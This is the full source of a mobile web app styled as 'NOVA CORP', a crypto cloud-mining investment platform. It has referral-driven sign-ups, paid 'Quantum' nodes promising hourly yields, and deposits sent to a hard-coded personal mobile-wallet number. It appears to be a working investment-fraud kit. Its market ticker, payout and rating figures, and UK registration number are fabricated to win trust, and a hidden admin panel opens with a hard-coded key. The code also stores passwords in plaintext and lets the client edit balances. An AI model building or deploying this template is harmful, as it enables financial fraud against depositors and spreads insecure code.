<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA CORP | PREMIUM TERMINAL</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --gold: #D4AF37; --dark: #0F172A; --soft-bg: #F8FAFC; }
        body { background: var(--soft-bg); font-family: 'Plus Jakarta Sans', sans-serif; color: #1e293b; -webkit-tap-highlight-color: transparent; }
        .glass-card { background: white; border: 1px solid #eef2f6; border-radius: 32px; box-shadow: 0 10px 30px rgba(0,0,0,0.03); transition: 0.3s; }
        .btn-premium { background: linear-gradient(135deg, #D4AF37, #B8860B); color: white; border-radius: 20px; font-weight: 800; border: none; box-shadow: 0 8px 20px rgba(212, 175, 55, 0.3); }
        .screen { display: none; min-height: 100vh; padding-bottom: 120px; }
        .active-screen { display: block; animation: slideUp 0.5s ease; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .nav-bar { position: fixed; bottom: 25px; left: 5%; width: 90%; background: #0F172A; border-radius: 35px; display: flex; justify-content: space-around; padding: 15px 0; z-index: 1000; box-shadow: 0 20px 40px rgba(0,0,0,0.2); }
        .nav-item { color: #64748b; font-size: 9px; font-weight: 800; display: flex; flex-direction: column; align-items: center; gap: 4px; text-transform: uppercase; }
        .nav-item.active { color: var(--gold); }
        .ticker-wrap { background: #0F172A; color: var(--gold); padding: 10px 0; font-size: 10px; font-weight: 900; overflow: hidden; border-bottom: 2px solid var(--gold); }
        .ticker-move { display: inline-block; white-space: nowrap; animation: ticker 40s linear infinite; }
        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        .node-img { width: 100%; height: 180px; object-fit: cover; border-radius: 28px; margin-bottom: 15px; }
        input, select { border-radius: 18px !important; background: #f1f5f9 !important; border: 1px solid #e2e8f0 !important; font-weight: 600; }
    </style>
</head>
<body>

    <div id="auth-screen" class="active-screen min-h-screen flex flex-col justify-center p-8 bg-white">
        <div class="text-center mb-10">
            <h1 class="text-6xl font-black italic tracking-tighter text-slate-900">NO<span class="text-gold">VA</span></h1>
            <p class="text-[9px] font-bold text-slate-400 tracking-[0.5em] mt-2 uppercase">Elite Digital Mining</p>
        </div>
        <div class="space-y-4 max-w-sm mx-auto w-full">
            <div class="space-y-2">
                <input type="text" id="u-id" placeholder="Username" class="w-full p-5 outline-none">
                <input type="password" id="u-pw" placeholder="Security Password" class="w-full p-5 outline-none">
                <input type="text" id="u-ref" placeholder="Referral Code (Optional)" class="w-full p-5 text-xs outline-none">
            </div>
            <button onclick="handleAuth()" class="w-full btn-premium py-5 uppercase tracking-widest text-xs">Access Account</button>
            <p onclick="toggleAuth()" id="auth-btn-text" class="text-[10px] text-center text-slate-400 font-black uppercase cursor-pointer underline decoration-gold underline-offset-4">Join the Network</p>
        </div>
    </div>

    <div id="app" class="hidden">
        <div class="ticker-wrap"><div class="ticker-move">MARKET STATUS: BULLISH • NEW QUANTUM NODES V21 ONLINE • WITHDRAWALS PROCESSING IN < 10 MINS • MINING EFFICIENCY AT 99.8% • </div></div>
        
        <header class="p-6 flex justify-between items-center bg-white/80 backdrop-blur-md sticky top-0 z-[100] border-b border-slate-100">
            <div class="flex items-center gap-3">
                <h2 id="logo-main" class="font-black text-2xl italic tracking-tighter cursor-pointer">NO<span class="text-gold">VA</span></h2>
                <button onclick="logout()" class="bg-red-50 text-red-500 p-2.5 rounded-full"><i class="fa-solid fa-power-off"></i></button>
            </div>
            <div class="text-right">
                <p id="user-tag" class="text-[8px] font-black uppercase text-slate-400 tracking-wider">@PREMIUM_USER</p>
                <p id="b-header" class="text-xl font-black text-slate-900 tracking-tighter">$0.00</p>
            </div>
        </header>

        <div id="scr-dash" class="screen active-screen px-6 pt-6">
            <div class="bg-slate-950 rounded-[45px] p-10 text-white mb-8 shadow-2xl border-b-[12px] border-gold relative overflow-hidden">
                <div class="absolute top-[-20%] right-[-10%] w-40 h-40 bg-gold/10 rounded-full blur-3xl"></div>
                <p class="text-[10px] text-slate-500 uppercase font-black mb-1">Total Assets</p>
                <h1 id="b-main" class="text-6xl font-black mb-10 tracking-tighter">$0.00</h1>
                <div class="flex justify-between items-end border-t border-white/5 pt-6">
                    <div><p class="text-[8px] text-slate-500 uppercase font-black">Mining Profit</p><p id="b-daily" class="text-2xl font-black text-green-400">+$0.00</p></div>
                    <div class="text-right"><p class="text-[8px] text-slate-500 uppercase font-black">Total Payouts</p><p id="b-total-p" class="text-2xl font-black text-gold">$0.00</p></div>
                </div>
            </div>

            <div class="grid grid-cols-3 gap-4 mb-8">
                <div onclick="openModal('mod-dep')" class="glass-card p-6 text-center active:scale-95"><i class="fa-solid fa-bolt-lightning text-gold text-2xl mb-2"></i><p class="text-[8px] font-black uppercase">Deposit</p></div>
                <div onclick="openModal('mod-wd')" class="glass-card p-6 text-center active:scale-95"><i class="fa-solid fa-wallet text-slate-400 text-2xl mb-2"></i><p class="text-[8px] font-black uppercase">Withdraw</p></div>
                <div onclick="claimDaily()" class="glass-card p-6 text-center active:scale-95"><i class="fa-solid fa-gift text-red-500 text-2xl mb-2"></i><p class="text-[8px] font-black uppercase">Bonus</p></div>
            </div>

            <div class="space-y-4">
                <div onclick="nav('scr-hist', this)" class="glass-card p-6 flex justify-between items-center"><div class="flex items-center gap-4"><i class="fa-solid fa-clock-rotate-left text-gold"></i><span class="text-xs font-black uppercase">Transaction Logs</span></div><i class="fa-solid fa-angle-right text-slate-300"></i></div>
                <div onclick="nav('scr-about', this)" class="glass-card p-6 flex justify-between items-center"><div class="flex items-center gap-4"><i class="fa-solid fa-shield-check text-gold"></i><span class="text-xs font-black uppercase">Company Profile</span></div><i class="fa-solid fa-angle-right text-slate-300"></i></div>
            </div>
        </div>

        <div id="scr-nodes" class="screen px-6 pt-8">
            <h3 class="font-black text-2xl mb-8 uppercase italic tracking-tighter">Premium Nodes</h3>
            <div id="nodes-grid" class="space-y-6"></div>
        </div>

        <div id="scr-team" class="screen px-6 pt-8">
            <h3 class="font-black text-2xl mb-8 uppercase italic tracking-tighter">Network Hub</h3>
            <div class="grid grid-cols-2 gap-4 mb-6">
                <div class="glass-card p-8 bg-slate-900 text-white text-center"><h5 id="team-count" class="text-4xl font-black text-gold">0</h5><p class="text-[8px] font-black uppercase mt-2">Direct Team</p></div>
                <div class="glass-card p-8 text-center"><h5 id="team-comm" class="text-4xl font-black text-slate-900">$0</h5><p class="text-[8px] font-black text-slate-400 uppercase mt-2">Commissions</p></div>
            </div>
            <div class="glass-card p-6 mb-6 flex justify-between items-center">
                <div><p class="text-[10px] font-black text-slate-400 uppercase">My Referral Code</p><p id="my-ref-code" class="text-sm font-black text-gold">NOVA-USER</p></div>
                <button class="bg-slate-50 p-3 rounded-xl"><i class="fa-solid fa-copy text-slate-400"></i></button>
            </div>
            <div id="team-list" class="space-y-3"></div>
        </div>

        <div id="scr-about" class="screen px-6 pt-8">
            <div class="glass-card p-8 space-y-6 relative overflow-hidden">
                <img src="https://images.unsplash.com/photo-1451187580459-43490279c0fa?w=600" class="rounded-[35px] w-full h-44 object-cover">
                <h4 class="font-black text-xl uppercase italic">Nova Corp International</h4>
                <p class="text-[11px] text-slate-500 font-bold leading-relaxed">Nova Corp is a leading UK-based fintech firm specializing in decentralized cloud mining since 2021. Our platform bridge the gap between complex blockchain tech and everyday investors.</p>
                <div class="grid grid-cols-3 gap-2 py-4 border-y border-slate-100">
                    <div class="text-center"><p class="text-xs font-black">50K+</p><p class="text-[7px] font-bold text-slate-400">USERS</p></div>
                    <div class="text-center"><p class="text-xs font-black">$5M+</p><p class="text-[7px] font-bold text-slate-400">PAYOUTS</p></div>
                    <div class="text-center"><p class="text-xs font-black">4.9/5</p><p class="text-[7px] font-bold text-slate-400">RATING</p></div>
                </div>
                <div class="bg-slate-50 p-6 rounded-3xl space-y-3">
                    <div class="flex justify-between text-[9px] font-black uppercase text-slate-400"><span>UK Registration</span><span class="text-slate-900">#99281-B</span></div>
                    <div class="flex justify-between text-[9px] font-black uppercase text-slate-400"><span>SSL Status</span><span class="text-green-600">SECURE ACTIVE</span></div>
                </div>
            </div>
        </div>

        <div id="scr-hist" class="screen px-6 pt-8">
            <h3 class="font-black text-2xl mb-8 uppercase italic tracking-tighter">Terminal History</h3>
            <div id="hist-list" class="space-y-3"></div>
        </div>

        <div id="scr-admin" class="screen px-6 pt-8">
            <div class="flex justify-between items-center mb-8">
                <h3 class="text-2xl font-black text-red-600 uppercase italic">Master Suite</h3>
                <span class="bg-red-50 text-red-600 text-[10px] font-black px-4 py-1.5 rounded-full">ADMIN ACCESS</span>
            </div>
            
            <div class="glass-card p-8 bg-slate-950 text-white mb-10 shadow-2xl">
                <p class="text-[10px] font-black text-slate-500 mb-6 uppercase text-center tracking-widest">Global Payment Config</p>
                <div class="space-y-4">
                    <div class="space-y-2"><label class="text-[8px] font-black text-slate-500 uppercase ml-2">EasyPaisa</label><input type="text" id="adm-ep" class="w-full p-4 rounded-xl text-black font-bold"></div>
                    <div class="space-y-2"><label class="text-[8px] font-black text-slate-500 uppercase ml-2">JazzCash</label><input type="text" id="adm-jc" class="w-full p-4 rounded-xl text-black font-bold"></div>
                    <div class="space-y-2"><label class="text-[8px] font-black text-slate-500 uppercase ml-2">Binance Pay ID</label><input type="text" id="adm-bin" class="w-full p-4 rounded-xl text-black font-bold"></div>
                    <button onclick="saveAdminSettings()" class="w-full btn-premium py-4 text-xs uppercase mt-4">Save Configuration</button>
                </div>
            </div>

            <h4 class="text-[10px] font-black uppercase text-slate-400 mb-4 ml-2">Pending Requests</h4>
            <div id="adm-pending" class="space-y-4 mb-10"></div>

            <h4 class="text-[10px] font-black uppercase text-slate-400 mb-4 ml-2">Registered Nodes</h4>
            <div id="adm-users" class="space-y-3"></div>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('scr-dash', this)" class="nav-item active"><i class="fa-solid fa-grid-2 text-2xl"></i><span>Home</span></div>
            <div onclick="nav('scr-nodes', this)" class="nav-item"><i class="fa-solid fa-server text-2xl"></i><span>Mining</span></div>
            <div onclick="nav('scr-team', this)" class="nav-item"><i class="fa-solid fa-users text-2xl"></i><span>Network</span></div>
            <div id="nav-adm" onclick="nav('scr-admin', this)" class="nav-item text-red-500" style="display:none;"><i class="fa-solid fa-crown text-2xl"></i><span>Master</span></div>
        </nav>
    </div>

    <div id="mod-dep" class="fixed inset-0 bg-white z-[2000] p-10 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10"><h2 class="font-black text-3xl uppercase italic tracking-tighter">Add Liquidity</h2><button onclick="closeModal('mod-dep')" class="text-slate-300 text-3xl"><i class="fa-solid fa-xmark"></i></button></div>
        <div class="grid grid-cols-3 gap-3 mb-8">
            <button onclick="showWay('ep')" class="glass-card p-4 font-black text-[9px] uppercase hover:bg-gold hover:text-white transition">EasyPaisa</button>
            <button onclick="showWay('jc')" class="glass-card p-4 font-black text-[9px] uppercase hover:bg-gold hover:text-white transition">JazzCash</button>
            <button onclick="showWay('bin')" class="glass-card p-4 font-black text-[9px] uppercase hover:bg-gold hover:text-white transition">Binance</button>
        </div>
        <div id="way-info" class="bg-slate-950 text-gold p-12 rounded-[45px] mb-8 hidden text-center shadow-2xl border-b-8 border-gold">
            <p class="text-[8px] font-black text-slate-500 uppercase mb-3">Copy Details</p>
            <p id="way-num" class="text-2xl font-black tracking-widest">0000000000</p>
        </div>
        <div class="space-y-4">
            <input type="number" id="dep-amt" placeholder="Deposit Amount ($)" class="w-full p-5 outline-none">
            <input type="text" id="dep-tx" placeholder="Transaction ID (TRX)" class="w-full p-5 outline-none">
            <button onclick="handleFinance('Deposit')" class="w-full btn-premium py-6 uppercase text-xs tracking-widest mt-6">Confirm Broadcast</button>
        </div>
    </div>

    <div id="mod-wd" class="fixed inset-0 bg-white z-[2000] p-10 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10"><h2 class="font-black text-3xl uppercase italic tracking-tighter">Withdraw</h2><button onclick="closeModal('mod-wd')" class="text-slate-300 text-3xl"><i class="fa-solid fa-xmark"></i></button></div>
        <div class="space-y-4">
            <select id="wd-method" class="w-full p-5 outline-none appearance-none"><option value="EasyPaisa">EasyPaisa</option><option value="JazzCash">JazzCash</option><option value="Binance USDT">Binance (USDT)</option></select>
            <input type="number" id="wd-amt" placeholder="Payout Amount ($)" class="w-full p-5 outline-none">
            <input type="text" id="wd-acc" placeholder="Wallet Address / Account" class="w-full p-5 outline-none">
            <button onclick="handleFinance('Withdraw')" class="w-full btn-premium py-6 uppercase text-xs tracking-widest mt-6">Request Payout</button>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where, deleteDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const fbCfg = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(fbCfg); const db = getFirestore(app);

        let user = localStorage.getItem('nova_user');
        let sys = { ep: "03279177196", jc: "03279177196", bin: "PAY-ID-88221" };
        let mode = 'login'; let tapCount = 0;

        const nodes = [];
        for(let i=0; i<21; i++) { nodes.push({ id: i+1, n: `QUANTUM V${i+1}`, c: 25 + (i * 35), y: 2.5 + (i * 3.5), img: "https://images.unsplash.com/photo-1639322537228-f710d846310a?w=500" }); }

        window.handleAuth = async () => {
            const id = document.getElementById('u-id').value.toLowerCase().trim();
            const pw = document.getElementById('u-pw').value;
            const ref = document.getElementById('u-ref').value.trim() || 'NOVA-CORP';
            if(!id || !pw) return alert("Fill credentials.");
            const uRef = doc(db, "users", id); const snap = await getDoc(uRef);
            if(mode === 'login') {
                if(snap.exists() && snap.data().pw === pw) {
                    if(snap.data().status === 'Banned') return alert("Access Revoked.");
                    localStorage.setItem('nova_user', id); location.reload();
                } else alert("Invalid Security Key.");
            } else {
                if(snap.exists()) return alert("Username already active.");
                await setDoc(uRef, { bal: 0, tp: 0, pw: pw, daily: 0, refBy: ref, active: [], lastClaim: 0, status: 'Active' });
                localStorage.setItem('nova_user', id); location.reload();
            }
        };

        window.logout = () => { if(confirm("Terminate Session?")) { localStorage.clear(); location.reload(); } };

        function initApp(id) {
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('app').classList.remove('hidden');
            document.getElementById('my-ref-code').innerText = id.toUpperCase();
            
            onSnapshot(doc(db, "users", id), d => {
                const u = d.data(); if(!u || u.status === 'Banned') { localStorage.clear(); location.reload(); }
                document.getElementById('user-tag').innerText = `@${id}`;
                document.getElementById('b-main').innerText = `$${u.bal.toFixed(2)}`;
                document.getElementById('b-header').innerText = `$${u.bal.toFixed(2)}`;
                document.getElementById('b-daily').innerText = `+$${u.daily.toFixed(2)}`;
                document.getElementById('b-total-p').innerText = `$${(u.tp || 0).toFixed(2)}`;
                renderNodes(u.active || []);
            });

            onSnapshot(query(collection(db, "logs"), where("user", "==", id)), s => {
                const hList = document.getElementById('hist-list'); hList.innerHTML = "";
                if(s.empty) hList.innerHTML = '<div class="glass-card p-10 text-center"><p class="text-[10px] font-black uppercase text-slate-300">No Transactions Found</p></div>';
                s.forEach(doc => {
                    const l = doc.data();
                    hList.innerHTML += `<div class="glass-card p-5 flex justify-between items-center">
                        <div><p class="text-[10px] font-black uppercase text-slate-900">${l.type}</p><p class="text-[8px] text-slate-400 font-bold">${new Date(l.timestamp).toLocaleString()}</p></div>
                        <div class="text-right"><p class="text-sm font-black ${l.type==='Deposit'?'text-green-600':'text-red-500'}">$${l.amount}</p><p class="text-[8px] font-black uppercase ${l.status==='Pending'?'text-orange-500':'text-blue-500'}">${l.status}</p></div>
                    </div>`;
                });
            });

            onSnapshot(query(collection(db, "users"), where("refBy", "==", id)), s => {
                document.getElementById('team-count').innerText = s.size;
                const tl = document.getElementById('team-list'); tl.innerHTML = "";
                s.forEach(doc => { tl.innerHTML += `<div class="glass-card p-5 flex justify-between items-center text-[10px]"><b>@${doc.id}</b><span class="text-green-500 font-black italic">CONNECTED</span></div>`; });
            });

            onSnapshot(doc(db, "config", "master"), d => { if(d.exists()) { sys = d.data(); document.getElementById('adm-ep').value = sys.ep; document.getElementById('adm-jc').value = sys.jc; document.getElementById('adm-bin').value = sys.bin; } });
        }

        function renderNodes(active) {
            const grid = document.getElementById('nodes-grid'); grid.innerHTML = "";
            nodes.forEach(n => {
                const isRun = active.includes(n.id);
                grid.innerHTML += `<div class="glass-card p-6 relative overflow-hidden">
                    <img src="${n.img}" class="node-img">
                    <div class="flex justify-between items-center">
                        <div><h4 class="font-black text-xs uppercase">${n.n}</h4><p class="text-[10px] text-green-600 font-black">Yield: $${n.y.toFixed(2)}/hr</p></div>
                        ${isRun ? `<span class="bg-green-50 text-green-600 px-5 py-2.5 rounded-full text-[9px] font-black">RUNNING</span>` : `<button onclick="buyNode(${n.id}, ${n.c}, ${n.y})" class="btn-premium px-6 py-3 text-[9px] uppercase">$${n.c}</button>`}
                    </div>
                </div>`;
            });
        }

        window.buyNode = async (id, c, y) => {
            const uRef = doc(db, "users", user); const s = await getDoc(uRef);
            if(s.data().bal < c) return alert("Liquidity Low. Please deposit.");
            await updateDoc(uRef, { bal: s.data().bal - c, active: [...s.data().active, id], daily: (s.data().daily || 0) + y });
            alert("Protocol Node Activated!");
        };

        window.claimDaily = async () => {
            const uRef = doc(db, "users", user); const s = await getDoc(uRef);
            if(Date.now() - (s.data().lastClaim || 0) < 86400000) return alert("Come back tomorrow sweetie!");
            await updateDoc(uRef, { bal: s.data().bal + 0.50, lastClaim: Date.now() });
            alert("Daily Bonus Secured!");
        };

        window.handleFinance = async (type) => {
            const amt = parseFloat(document.getElementById(type === 'Deposit' ? 'dep-amt' : 'wd-amt').value);
            const ref = document.getElementById(type === 'Deposit' ? 'dep-tx' : 'wd-acc').value;
            if(!amt || !ref) return alert("Please fill all fields.");
            await addDoc(collection(db, "logs"), { user, type, amount: amt, ref, status: 'Pending', timestamp: Date.now(), method: type === 'Withdraw' ? document.getElementById('wd-method').value : 'Direct' });
            alert("Request Sent to Master Node!"); closeModal('mod-dep'); closeModal('mod-wd');
        };

        document.getElementById('logo-main').onclick = () => { tapCount++; if(tapCount >= 5) { if(prompt("Master Key:") === "nov786") { document.getElementById('nav-adm').style.display="flex"; loadMaster(); } tapCount=0; } };

        function loadMaster() {
            onSnapshot(query(collection(db, "logs"), where("status", "==", "Pending")), s => {
                const al = document.getElementById('adm-pending'); al.innerHTML = "";
                s.forEach(d => {
                    al.innerHTML += `<div class="glass-card p-5 text-[10px] flex justify-between items-center border-l-8 border-gold">
                        <div><b>@${d.data().user}</b> [${d.data().type}]<br>$${d.data().amount} via ${d.data().method || 'N/A'}<br>${d.data().ref}</div>
                        <div class="flex gap-2">
                            <button onclick="approveAction('${d.id}', '${d.data().user}', ${d.data().amount}, '${d.data().type}')" class="bg-green-500 text-white p-3 rounded-xl"><i class="fa-solid fa-check"></i></button>
                            <button onclick="deleteDoc(doc(db, 'logs', '${d.id}'))" class="bg-red-500 text-white p-3 rounded-xl"><i class="fa-solid fa-trash"></i></button>
                        </div>
                    </div>`;
                });
            });
            onSnapshot(collection(db, "users"), s => {
                const ul = document.getElementById('adm-users'); ul.innerHTML = "";
                s.forEach(d => {
                    ul.innerHTML += `<div class="glass-card p-4 flex justify-between items-center text-[10px]">
                        <div><b>@${d.id}</b> - Bal: $${d.data().bal.toFixed(2)}</div>
                        <button onclick="updateStatus('${d.id}', 'Banned')" class="text-red-500 font-black">BAN</button>
                    </div>`;
                });
            });
        }

        window.approveAction = async (lid, uid, amt, type) => {
            const uRef = doc(db, "users", uid); const us = await getDoc(uRef);
            if(type === 'Deposit') await updateDoc(uRef, { bal: (us.data().bal || 0) + amt });
            if(type === 'Withdraw') await updateDoc(uRef, { bal: (us.data().bal || 0) - amt, tp: (us.data().tp || 0) + amt });
            await updateDoc(doc(db, "logs", lid), { status: 'Approved' }); alert("Protocol Approved!");
        };

        window.updateStatus = async (uid, s) => { await updateDoc(doc(db, "users", uid), { status: s }); };
        window.saveAdminSettings = async () => {
            await setDoc(doc(db, "config", "master"), { ep: document.getElementById('adm-ep').value, jc: document.getElementById('adm-jc').value, bin: document.getElementById('adm-bin').value }, { merge: true });
            alert("System Config Updated!");
        };

        window.nav = (id, el) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.getElementById(id).classList.add('active-screen');
            if(el) { document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active')); el.classList.add('active'); }
        };
        window.showWay = (t) => { document.getElementById('way-info').classList.remove('hidden'); document.getElementById('way-num').innerText = sys[t] || "N/A"; };
        window.openModal = (id) => document.getElementById(id).classList.remove('hidden');
        window.closeModal = (id) => document.getElementById(id).classList.add('hidden');
        window.toggleAuth = () => { mode = mode === 'login' ? 'reg' : 'login'; document.getElementById('auth-btn-text').innerText = mode === 'login' ? "Join the Network" : "Return to Login"; };

        if(user) initApp(user);
    </script>
</body>
</html>
